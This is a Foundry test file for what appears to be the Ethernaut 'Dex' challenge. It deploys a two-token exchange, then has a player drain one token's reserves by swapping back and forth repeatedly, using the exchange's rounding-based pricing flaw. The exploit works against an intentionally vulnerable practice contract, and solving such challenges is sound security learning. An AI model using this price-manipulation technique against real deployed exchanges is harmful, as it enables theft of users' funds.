// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/Test.sol";
import "src/22_Dex.sol";

contract DexTest is Test {
    Dex instance;
    address player1;
    ERC20 token1;
    ERC20 token2;

    function setUp() public {
        player1 = vm.addr(1);

        instance = new Dex();
        address instanceAddress = address(instance);

        SwappableToken tokenInstance = new SwappableToken(
            instanceAddress,
            "Token 1",
            "TKN1",
            110
        );
        SwappableToken tokenInstanceTwo = new SwappableToken(
            instanceAddress,
            "Token 2",
            "TKN2",
            110
        );

        token1 = ERC20(tokenInstance);
        token2 = ERC20(tokenInstanceTwo);

        address tokenInstanceAddress = address(tokenInstance);
        address tokenInstanceTwoAddress = address(tokenInstanceTwo);

        instance.setTokens(tokenInstanceAddress, tokenInstanceTwoAddress);

        tokenInstance.approve(instanceAddress, 100);
        tokenInstanceTwo.approve(instanceAddress, 100);

        instance.addLiquidity(tokenInstanceAddress, 100);
        instance.addLiquidity(tokenInstanceTwoAddress, 100);

        tokenInstance.transfer(player1, 10);
        tokenInstanceTwo.transfer(player1, 10);
    }

    function testattacker() public {
        vm.startPrank(player1, player1);

        token1.approve(address(instance), 2 ** 256 - 1);
        token2.approve(address(instance), 2 ** 256 - 1);

        swapMax(token1, token2);
        swapMax(token2, token1);
        swapMax(token1, token2);
        swapMax(token2, token1);
        swapMax(token1, token2);

        instance.swap(address(token2), address(token1), 45);

        assertEq(
            token1.balanceOf(address(instance)) == 0 ||
                token2.balanceOf(address(instance)) == 0,
            true
        );

        vm.stopPrank();
    }

    function swapMax(ERC20 tokenIn, ERC20 tokenOut) public {
        instance.swap(
            address(tokenIn),
            address(tokenOut),
            tokenIn.balanceOf(player1)
        );
    }
}
